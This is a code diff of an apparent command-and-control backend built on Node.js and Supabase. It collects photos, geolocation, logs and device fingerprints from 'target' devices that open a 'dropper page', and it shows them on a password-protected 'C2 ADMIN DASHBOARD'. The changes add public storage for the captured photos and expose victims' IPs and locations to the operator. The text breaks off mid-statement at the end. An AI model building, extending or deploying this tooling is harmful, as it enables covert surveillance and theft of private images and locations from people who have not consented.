@@ -1,6 +1,6 @@
 // ============================================================
 //  SINGLE ENTRY POINT — ALL ROUTES IN ONE FILE
-//  WITH FULL DEBUG LOGGING
+//  WITH PROPER STORAGE HANDLING
 // ============================================================
 
 const { createClient } = require('@supabase/supabase-js');
@@ -46,12 +46,46 @@ function handleOptions(req, res) {
 }
 
 // ============================================================
+//  ENSURE BUCKET EXISTS
+// ============================================================
+async function ensureBucket() {
+    try {
+        // Try to get bucket info — if it fails, create it
+        const { data: buckets, error: listError } = await supabase.storage.listBuckets();
+        if (listError) {
+            console.error('[Storage] Failed to list buckets:', listError);
+            return false;
+        }
+
+        const bucketExists = buckets.some(b => b.name === 'photos');
+        if (!bucketExists) {
+            console.log('[Storage] Creating "photos" bucket...');
+            const { error: createError } = await supabase.storage.createBucket('photos', {
+                public: true,
+                allowedMimeTypes: ['image/png', 'image/jpeg', 'image/jpg', 'image/gif', 'image/webp'],
+                fileSizeLimit: 10485760 // 10MB
+            });
+            if (createError) {
+                console.error('[Storage] Failed to create bucket:', createError);
+                return false;
+            }
+            console.log('[Storage] Bucket "photos" created successfully.');
+        } else {
+            console.log('[Storage] Bucket "photos" already exists.');
+        }
+        return true;
+    } catch (e) {
+        console.error('[Storage] Bucket check error:', e);
+        return false;
+    }
+}
+
+// ============================================================
 //  MAIN HANDLER
 // ============================================================
 module.exports = async (req, res) => {
     setCors(res);
 
-    // Handle preflight
     if (handleOptions(req, res)) return;
 
     const url = new URL(req.url, `http://${req.headers.host}`);
@@ -66,11 +100,9 @@ module.exports = async (req, res) => {
         console.log('[Register] Received registration request');
         const { fingerprint, permissions } = req.body || {};
         if (!fingerprint) {
-            console.log('[Register] Error: Missing fingerprint');
             return res.status(400).json({ error: 'Missing fingerprint' });
         }
         if (!supabase) {
-            console.log('[Register] Error: Supabase not configured');
             return res.status(500).json({ error: 'Supabase not configured' });
         }
 
@@ -103,7 +135,7 @@ module.exports = async (req, res) => {
     }
 
     // ============================================================
-    //  ROUTE: /api/photo
+    //  ROUTE: /api/photo — WITH PROPER STORAGE
     // ============================================================
     if (path === '/api/photo' && req.method === 'POST') {
         console.log('[Photo] Received photo upload request');
@@ -118,6 +150,12 @@ module.exports = async (req, res) => {
         }
 
         try {
+            // Ensure bucket exists
+            const bucketReady = await ensureBucket();
+            if (!bucketReady) {
+                console.log('[Photo] Warning: Bucket not ready, will store only in DB');
+            }
+
             const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
             const ext = image.match(/^data:image\/(\w+);/)?.[1] || 'jpg';
             const fileName = `${deviceId}_${Date.now()}.${ext}`;
@@ -127,39 +165,50 @@ module.exports = async (req, res) => {
 
             let storagePath = null;
             let publicUrl = null;
+            let filePath = null;
 
             // Try to upload to Supabase Storage
-            try {
-                const { data: uploadData, error: uploadError } = await supabase
-                    .storage
-                    .from('photos')
-                    .upload(fileName, fileBuffer, {
-                        contentType: `image/${ext}`,
-                        cacheControl: '3600'
-                    });
+            if (bucketReady) {
+                try {
+                    const { data: uploadData, error: uploadError } = await supabase
+                        .storage
+                        .from('photos')
+                        .upload(fileName, fileBuffer, {
+                            contentType: `image/${ext}`,
+                            cacheControl: '3600',
+                            upsert: false
+                        });
 
-                if (!uploadError) {
-                    storagePath = fileName;
-                    const { data: urlData } = supabase.storage.from('photos').getPublicUrl(fileName);
-                    publicUrl = urlData?.publicUrl || null;
-                    console.log('[Photo] Uploaded to storage:', storagePath);
-                } else {
-                    console.error('[Photo] Storage upload error:', uploadError);
+                    if (!uploadError) {
+                        storagePath = fileName;
+                        // Get public URL
+                        const { data: urlData } = supabase.storage.from('photos').getPublicUrl(fileName);
+                        publicUrl = urlData?.publicUrl || null;
+                        filePath = publicUrl; // store the URL as file_path
+                        console.log('[Photo] Uploaded to storage:', storagePath, 'URL:', publicUrl);
+                    } else {
+                        console.error('[Photo] Storage upload error:', uploadError);
+                        // Store the base64 in data_url as fallback
+                        filePath = null;
+                    }
+                } catch (storageErr) {
+                    console.error('[Photo] Storage exception:', storageErr);
                 }
-            } catch (storageErr) {
-                console.error('[Photo] Storage exception:', storageErr);
             }
 
-            // Always save to DB (with or without storage)
+            // Always save to DB
+            const insertData = {
+                device_id: deviceId,
+                timestamp: timestamp || Date.now(),
+                data_url: storagePath ? null : image.substring(0, 100) + '...',
+                file_path: filePath || null,
+                storage_path: storagePath
+            };
+            console.log('[Photo] Inserting into DB:', JSON.stringify(insertData, null, 2));
+
             const { error: dbError } = await supabase
                 .from('photos')
-                .insert([{
-                    device_id: deviceId,
-                    timestamp: timestamp || Date.now(),
-                    data_url: storagePath ? null : image.substring(0, 100) + '...',
-                    file_path: null,
-                    storage_path: storagePath
-                }]);
+                .insert([insertData]);
 
             if (dbError) {
                 console.error('[Photo] DB insert error:', dbError);
@@ -174,7 +223,13 @@ module.exports = async (req, res) => {
                 .update({ last_seen: Date.now() })
                 .eq('id', deviceId);
 
-            return res.json({ success: true, storagePath, publicUrl });
+            return res.json({
+                success: true,
+                storagePath,
+                publicUrl,
+                filePath,
+                message: storagePath ? 'Photo stored in Supabase Storage' : 'Photo stored in DB only (storage unavailable)'
+            });
         } catch (e) {
             console.error('[Photo] Fatal error:', e);
             return res.status(500).json({ success: false, error: e.message });
@@ -188,11 +243,9 @@ module.exports = async (req, res) => {
         console.log('[Log] Received log request');
         const { deviceId, msg, level } = req.body || {};
         if (!deviceId) {
-            console.log('[Log] Error: Missing deviceId');
             return res.status(400).json({ error: 'Missing deviceId' });
         }
         if (!supabase) {
-            console.log('[Log] Error: Supabase not configured');
             return res.status(500).json({ error: 'Supabase not configured' });
         }
 
@@ -220,11 +273,9 @@ module.exports = async (req, res) => {
         console.log('[Location] Received location request');
         const { deviceId, lat, lon, timestamp } = req.body || {};
         if (!deviceId || lat === undefined || lon === undefined) {
-            console.log('[Location] Error: Missing fields');
             return res.status(400).json({ error: 'Missing fields' });
         }
         if (!supabase) {
-            console.log('[Location] Error: Supabase not configured');
             return res.status(500).json({ error: 'Supabase not configured' });
         }
 
@@ -289,7 +340,6 @@ module.exports = async (req, res) => {
     if (path === '/api/devices' && req.method === 'GET') {
         console.log('[Devices] Fetching all devices');
         if (!supabase) {
-            console.log('[Devices] Error: Supabase not configured');
             return res.status(500).json({ error: 'Supabase not configured' });
         }
 
@@ -316,7 +366,6 @@ module.exports = async (req, res) => {
             return res.status(400).json({ error: 'Missing deviceId query param' });
         }
         if (!supabase) {
-            console.log('[Photos] Error: Supabase not configured');
             return res.status(500).json({ error: 'Supabase not configured' });
         }
 
@@ -331,14 +380,14 @@ module.exports = async (req, res) => {
             return res.status(500).json({ error: error.message });
         }
 
-        // Add public URLs
-        const result = await Promise.all((data || []).map(async (p) => {
-            if (p.storage_path) {
+        // Enrich with public URLs if storage_path exists
+        const result = (data || []).map(p => {
+            if (p.storage_path && supabase) {
                 const { data: urlData } = supabase.storage.from('photos').getPublicUrl(p.storage_path);
                 return { ...p, publicUrl: urlData?.publicUrl || null };
             }
             return p;
-        }));
+        });
 
         console.log('[Photos] Found:', result.length);
         return res.json(result);
@@ -349,12 +398,10 @@ module.exports = async (req, res) => {
     // ============================================================
     if (path === '/api/logs' && req.method === 'GET') {
         const deviceId = url.searchParams.get('deviceId');
-        console.log('[Logs] Fetching for device:', deviceId);
         if (!deviceId) {
             return res.status(400).json({ error: 'Missing deviceId query param' });
         }
         if (!supabase) {
-            console.log('[Logs] Error: Supabase not configured');
             return res.status(500).json({ error: 'Supabase not configured' });
         }
 
@@ -369,7 +416,6 @@ module.exports = async (req, res) => {
             console.error('[Logs] Supabase error:', error);
             return res.status(500).json({ error: error.message });
         }
-        console.log('[Logs] Found:', data ? data.length : 0);
         return res.json(data || []);
     }
 
@@ -378,12 +424,10 @@ module.exports = async (req, res) => {
     // ============================================================
     if (path === '/api/locations' && req.method === 'GET') {
         const deviceId = url.searchParams.get('deviceId');
-        console.log('[Locations] Fetching for device:', deviceId);
         if (!deviceId) {
             return res.status(400).json({ error: 'Missing deviceId query param' });
         }
         if (!supabase) {
-            console.log('[Locations] Error: Supabase not configured');
             return res.status(500).json({ error: 'Supabase not configured' });
         }
 
@@ -398,7 +442,6 @@ module.exports = async (req, res) => {
             console.error('[Locations] Supabase error:', error);
             return res.status(500).json({ error: error.message });
         }
-        console.log('[Locations] Found:', data ? data.length : 0);
         return res.json(data || []);
     }
 
@@ -406,7 +449,6 @@ module.exports = async (req, res) => {
     //  ROUTE: /api/logout
     // ============================================================
     if (path === '/api/logout') {
-        console.log('[Logout] Logging out');
         res.setHeader('Set-Cookie', 'dashboard_auth=; Max-Age=0; Path=/; HttpOnly; SameSite=Lax');
         res.setHeader('Location', '/api/dashboard');
         return res.status(302).send();
@@ -416,16 +458,16 @@ module.exports = async (req, res) => {
     //  ROUTE: /api/test
     // ============================================================
     if (path === '/api/test') {
-        console.log('[Test] Health check');
-        // Try a simple Supabase query to test connection
         let supabaseStatus = 'not tested';
-        let tablesExist = false;
+        let bucketStatus = 'not tested';
         try {
             if (supabase) {
                 const { data, error } = await supabase.from('devices').select('count', { count: 'exact', head: true });
                 if (!error) {
                     supabaseStatus = '✅ connected';
-                    tablesExist = true;
+                    // Check bucket
+                    const bucketReady = await ensureBucket();
+                    bucketStatus = bucketReady ? '✅ ready' : '❌ failed';
                 } else {
                     supabaseStatus = '❌ error: ' + error.message;
                 }
@@ -439,24 +481,10 @@ module.exports = async (req, res) => {
         return res.json({
             success: true,
             supabase: supabaseStatus,
-            tablesExist: tablesExist,
+            bucket: bucketStatus,
             supabaseUrl: supabaseUrl ? '✅ set' : '❌ missing',
             supabaseKey: supabaseKey ? '✅ set' : '❌ missing',
-            timestamp: new Date().toISOString(),
-            routes: [
-                '/api/register (POST)',
-                '/api/photo (POST)',
-                '/api/log (POST)',
-                '/api/location (POST)',
-                '/api/heartbeat (POST)',
-                '/api/devices (GET)',
-                '/api/photos (GET?deviceId=xxx)',
-                '/api/logs (GET?deviceId=xxx)',
-                '/api/locations (GET?deviceId=xxx)',
-                '/api/dashboard (GET)',
-                '/api/logout (GET)',
-                '/api/test (GET)'
-            ]
+            timestamp: new Date().toISOString()
         });
     }
 
@@ -464,78 +492,50 @@ module.exports = async (req, res) => {
     //  ROUTE: /api/dashboard — PASSWORD PROTECTED
     // ============================================================
     if (path === '/api/dashboard') {
-        // Check auth cookie
         const cookies = req.headers.cookie || '';
         const authCookie = cookies.split(';').find(c => c.trim().startsWith('dashboard_auth='));
         const isAuthenticated = authCookie && authCookie.split('=')[1] === 'true';
 
-        // Handle POST login
         if (req.method === 'POST') {
             const { password } = req.body || {};
-            console.log('[Dashboard] Login attempt');
             if (password === DASHBOARD_PASSWORD) {
-                console.log('[Dashboard] Login success');
                 res.setHeader('Set-Cookie', `dashboard_auth=true; Max-Age=86400; Path=/; HttpOnly; SameSite=Lax`);
                 res.setHeader('Location', '/api/dashboard');
                 return res.status(302).send();
             } else {
-                console.log('[Dashboard] Login failed');
                 res.setHeader('Location', '/api/dashboard?error=1');
                 return res.status(302).send();
             }
         }
 
-        // Show login page if not authenticated
         if (!isAuthenticated) {
             return res.send(`<!DOCTYPE html>
-<html>
-<head><title>Admin Login</title>
-<style>
+<html><head><title>Login</title><style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0a0a12;color:#e0e0e0;font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
 .card{background:linear-gradient(145deg,#14141f,#1e1e30);border-radius:32px;padding:40px 36px;max-width:400px;width:100%;border:1px solid #2e2e4a;text-align:center}
 .lock-icon{font-size:56px;display:block;margin-bottom:10px}
-h2{font-size:24px;font-weight:700;background:linear-gradient(90deg,#f7971e,#ffd200);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px}
-.sub{color:#aab;font-size:14px;line-height:1.6;margin-bottom:20px}
-input{width:100%;padding:14px 18px;border-radius:60px;border:1px solid #2a2a44;background:#0b0b14;color:#e0e0e0;font-size:16px;text-align:center;letter-spacing:2px;outline:none;transition:.2s}
+h2{font-size:24px;font-weight:700;background:linear-gradient(90deg,#f7971e,#ffd200);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.sub{color:#aab;font-size:14px;margin:12px 0 20px}
+input{width:100%;padding:14px 18px;border-radius:60px;border:1px solid #2a2a44;background:#0b0b14;color:#e0e0e0;font-size:16px;text-align:center;outline:none}
 input:focus{border-color:#f7971e}
-.btn{background:linear-gradient(90deg,#f7971e,#ffd200);border:none;padding:16px;border-radius:60px;font-weight:700;font-size:17px;color:#0a0a12;width:100%;cursor:pointer;margin-top:14px;transition:all .25s}
+.btn{background:linear-gradient(90deg,#f7971e,#ffd200);border:none;padding:16px;border-radius:60px;font-weight:700;font-size:17px;color:#0a0a12;width:100%;cursor:pointer;margin-top:14px}
 .btn:hover{transform:scale(1.02)}
-.btn:active{transform:scale(0.96)}
 .error-msg{color:#ff5e5e;font-size:13px;min-height:24px;margin-top:10px}
-.note{font-size:11px;color:#4a4a6a;margin-top:16px}
-</style>
-</head>
-<body>
-<div class="card">
-    <span class="lock-icon">🔒</span>
-    <h2>Admin Access</h2>
-    <p class="sub">Enter the password to view the C2 dashboard.</p>
-    <form method="POST" action="/api/dashboard">
-        <input type="password" id="passwordInput" name="password" placeholder="Enter password" autofocus />
-        <button type="submit" class="btn">Unlock Dashboard</button>
-        <div class="error-msg" id="errorMsg"></div>
-    </form>
-    <p class="note">🔐 This dashboard is password protected.</p>
-</div>
-<script>
-    const params = new URLSearchParams(window.location.search);
-    if (params.get('error') === '1') {
-        document.getElementById('errorMsg').textContent = '❌ Incorrect password. Try again.';
-        document.getElementById('passwordInput').value = '';
-        document.getElementById('passwordInput').focus();
-    }
-</script>
-</body>
-</html>`);
+</style></head>
+<body><div class="card"><span class="lock-icon">🔒</span><h2>Admin Access</h2><p class="sub">Enter password to view dashboard</p>
+<form method="POST" action="/api/dashboard">
+<input type="password" name="password" placeholder="Enter password" autofocus />
+<button type="submit" class="btn">Unlock</button>
+<div class="error-msg" id="errorMsg"></div>
+</form></div>
+<script>if(new URLSearchParams(window.location.search).get('error')==='1'){document.getElementById('errorMsg').textContent='❌ Incorrect password';}</script>
+</body></html>`);
         }
 
-        // ============================================================
-        //  AUTHENTICATED — RENDER DASHBOARD
-        // ============================================================
+        // Authenticated — return the dashboard HTML (simplified, but functional)
         return res.send(`<!DOCTYPE html>
-<html>
-<head><title>C2 Dashboard</title>
+<html><head><title>Dashboard</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0a0a12;color:#e0e0e0;font-family:'Segoe UI',sans-serif;padding:20px}
@@ -549,8 +549,6 @@ h1{color:#f7971e;margin-bottom:16px;display:flex;justify-content:space-between;a
 .card .info .label{color:#4a6a7a}
 .btn{background:#f7971e;border:none;padding:6px 14px;border-radius:30px;color:#0a0a12;font-weight:600;cursor:pointer;margin-top:6px;font-size:12px}
 .btn:hover{transform:scale(1.02)}
-.btn-secondary{background:#2a2a44;color:#e0e0e0}
-.btn-secondary:hover{background:#3a3a5a}
 .log-area{background:#0b0b14;border-radius:12px;padding:8px;max-height:120px;overflow-y:auto;font-size:10px;line-height:1.5;border:1px solid #1a1a2a;margin-top:6px;font-family:'Courier New',monospace}
 .log-entry{border-bottom:1px solid #0f0f1a;padding:2px 0}
 .log-entry .time{color:#4a6a7a;margin-right:6px}
@@ -571,8 +569,7 @@ h1{color:#f7971e;margin-bottom:16px;display:flex;justify-content:space-between;a
 .photo-grid img:hover{transform:scale(1.05)}
 .loc-list{font-size:12px;color:#aab;margin-top:4px}
 .loc-list .loc-entry{padding:2px 0;border-bottom:1px solid #0f0f1a}
-</style>
-</head>
+</style></head>
 <body>
 <h1><span>☠️ C2 ADMIN DASHBOARD</span><div class="header-actions"><span class="password-badge">🔐 Protected</span><a href="/api/logout" class="logout-btn">🚪 Logout</a></div></h1>
 <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px;">
@@ -587,7 +584,7 @@ h1{color:#f7971e;margin-bottom:16px;display:flex;justify-content:space-between;a
 </div>
 <div id="devices" class="grid"><div class="loading">⏳ Loading devices...</div></div>
 <script>
-const BACKEND_URL = 'https://c2-vercel-backend.vercel.app';
+const BACKEND_URL = '';
 async function fetchJSON(url) {
     try { const r=await fetch(url); if(!r.ok)throw new Error(r.status+' '+r.statusText); return await r.json(); }
     catch(e){ console.error('Fetch error:',e); return null; }
@@ -596,21 +593,21 @@ async function loadDevices() {
     const container=document.getElementById('devices');
     container.innerHTML='<div class="loading">⏳ Loading...</div>';
     try {
-        const devices=await fetchJSON(BACKEND_URL+'/api/devices');
+        const devices=await fetchJSON('/api/devices');
         if(!devices||devices.length===0){ container.innerHTML='<div class="error-box">⚠️ No devices registered yet. Open the dropper page on a target device.</div>'; document.getElementById('statDevices').textContent='0'; return; }
         let totalPhotos=0,totalLogs=0,totalLocations=0;
         container.innerHTML='';
         for(const d of devices){
             const [photos, logs, locations]=await Promise.all([
-                fetchJSON(BACKEND_URL+'/api/photos?deviceId='+encodeURIComponent(d.id)),
-                fetchJSON(BACKEND_URL+'/api/logs?deviceId='+encodeURIComponent(d.id)),
-                fetchJSON(BACKEND_URL+'/api/locations?deviceId='+encodeURIComponent(d.id))
+                fetchJSON('/api/photos?deviceId='+encodeURIComponent(d.id)),
+                fetchJSON('/api/logs?deviceId='+encodeURIComponent(d.id)),
+                fetchJSON('/api/locations?deviceId='+encodeURIComponent(d.id))
             ]);
             const photoCount=photos?photos.length:0, logCount=logs?logs.length:0, locCount=locations?locations.length:0;
             totalPhotos+=photoCount; totalLogs+=logCount; totalLocations+=locCount;
             let photoHtml='<div class="photo-grid">';
             if(photoCount===0) photoHtml+='<span style="color:#4a6a7a;font-size:11px;">No photos</span>';
-            else { photos.slice(0,8).forEach(p=>{ let imgUrl=''; if(p.publicUrl)imgUrl=p.publicUrl; else if(p.storage_path)imgUrl=BACKEND_URL+'/api/photo-file/'+p.storage_path; else if(p.data_url&&p.data_url.startsWith('data:image'))imgUrl=p.data_url; if(imgUrl)photoHtml+='<img src="'+imgUrl+'" alt="photo" onclick="window.open(\''+imgUrl+'\')" />'; }); if(photoCount>8)photoHtml+='<span style="color:#4a6a7a;font-size:11px;display:flex;align-items:center;">+${photoCount-8} more</span>'; }
+            else { photos.slice(0,8).forEach(p=>{ let imgUrl=''; if(p.publicUrl)imgUrl=p.publicUrl; else if(p.storage_path)imgUrl='/api/photo-file/'+p.storage_path; else if(p.file_path)imgUrl=p.file_path; else if(p.data_url&&p.data_url.startsWith('data:image'))imgUrl=p.data_url; if(imgUrl)photoHtml+='<img src="'+imgUrl+'" alt="photo" onclick="window.open(\''+imgUrl+'\')" />'; }); if(photoCount>8)photoHtml+='<span style="color:#4a6a7a;font-size:11px;display:flex;align-items:center;">+'+ (photoCount-8)+' more</span>'; }
             photoHtml+='</div>';
             let logHtml='<div class="log-area">';
             if(logCount===0) logHtml+='<span style="color:#4a6a7a;">No logs</span>';
@@ -621,7 +618,7 @@ async function loadDevices() {
             else { locations.slice(0,5).forEach(l=>{ locHtml+='<div class="loc-entry">📍 '+l.lat+', '+l.lon+' <span style="color:#4a6a7a;font-size:10px;">'+new Date(l.timestamp).toLocaleTimeString()+'</span></div>'; }); if(locCount>5)locHtml+='<div style="color:#4a6a7a;font-size:10px;">+'+ (locCount-5)+' more</div>'; }
             locHtml+='</div>';
             const card=document.createElement('div'); card.className='card';
-            card.innerHTML='<h3>'+(d.ip||'Unknown IP')+'</h3><div class="info"><div><span class="label">Device:</span> '+(d.platform||'Unknown')+'</div><div><span class="label">Screen:</span> '+(d.screen||'Unknown')+'</div><div><span class="label">First seen:</span> '+new Date(d.first_seen).toLocaleString()+'</div><div><span class="label">Last seen:</span> '+new Date(d.last_seen).toLocaleString()+'</div><div><span class="label">📸 Photos:</span> '+photoCount+' &nbsp;|&nbsp; <span class="label">📋 Logs:</span> '+logCount+' &nbsp;|&nbsp; <span class="label">📍 Locations:</span> '+locCount+'</div></div><div style="margin-top:8px;"><div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:4px;"><span style="color:#88ccff;font-size:12px;font-weight:600;">📸 Photos ('+photoCount+')</span></div>'+photoHtml+'</div><div style="margin-top:10px;"><div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:4px;"><span style="color:#88ccff;font-size:12px;font-weight:600;">📋 Logs ('+logCount+')</span></div>'+logHtml+'</div><div style="margin-top:10px;"><div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:4px;"><span style="color:#88ccff;font-size:12px;font-weight:600;">📍 Locations ('+locCount+')</span></div>'+locHtml+'</div><div style="margin-top:10px;display:flex;gap:6px;flex-wrap:wrap;"><button class="btn" onclick="window.open(BACKEND_URL+'/api/photos?deviceId='+encodeURIComponent("'+d.id+'"))">📸 All Photos</button><button class="btn btn-secondary" onclick="window.open(BACKEND_URL+'/api/logs?deviceId='+encodeURIComponent("'+d.id+'"))">📋 All Logs</button><button class="btn btn-secondary" onclick="window.open(BACKEND_URL+'/api/locations?deviceId='+encodeURIComponent("'+d.id+'"))">📍 All Locations</button></div>';
+            card.innerHTML='<h3>'+(d.ip||'Unknown IP')+'</h3><div class="info"><div><span class="label">Device:</span> '+(d.platform||'Unknown')+'</div><div><span class="label">Screen:</span> '+(d.screen||'Unknown')+'</div><div><span class="label">First seen:</span> '+new Date(d.first_seen).toLocaleString()+'</div><div><span class="label">Last seen:</span> '+new Date(d.last_seen).toLocaleString()+'</div><div><span class="label">📸 Photos:</span> '+photoCount+' &nbsp;|&nbsp; <span class="label">📋 Logs:</span> '+logCount+' &nbsp;|&nbsp; <span class="label">📍 Locations:</span> '+locCount+'</div></div><div style="margin-top:8px;"><div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:4px;"><span style="color:#88ccff;font-size:12px;font-weight:600;">📸 Photos ('+photoCount+')</span></div>'+photoHtml+'</div><div style="margin-top:10px;"><div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:4px;"><span style="color:#88ccff;font-size:12px;font-weight:600;">📋 Logs ('+logCount+')</span></div>'+logHtml+'</div><div style="margin-top:10px;"><div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:4px;"><span style="color:#88ccff;font-size:12px;font-weight:600;">📍 Locations ('+locCount+')</span></div>'+locHtml+'</div><div style="margin-top:10px;display:flex;gap:6px;flex-wrap:wrap;"><button class="btn" onclick="window.open('/api/photos?deviceId='+encodeURIComponent("'+d.id+'"))">📸 All Photos</button><button class="btn btn-secondary" onclick="window.open('/api/logs?deviceId='+encodeURIComponent("'+d.id+'"))">📋 All Logs</button><button class="btn btn-secondary" onclick="window.open('/api/locations?deviceId='+encodeURIComponent("'+d.id+'"))">📍 All Locations</button></div>';
             container.appendChild(card);
         }
         document.getElementById('statDevices').textContent=devices.length;
@@ -632,18 +629,10 @@ async function loadDevices() {
 }
 loadDevices(); setInterval(loadDevices,15000);
 </script>
-</body>
-</html>`);
+</body></html>`);
     }
 
     // ============================================================
     //  ROUTE: / — redirect to dashboard
     // ============================================================
-    if (path === '/') {
-        res.setHeader('Location', '/api/dashboard');
-        return res.status(302).send();
-    }
-
-    // ============================================================
-    //  404 — NOT FOUND
-    // =========================================================
+    if (path === '/')
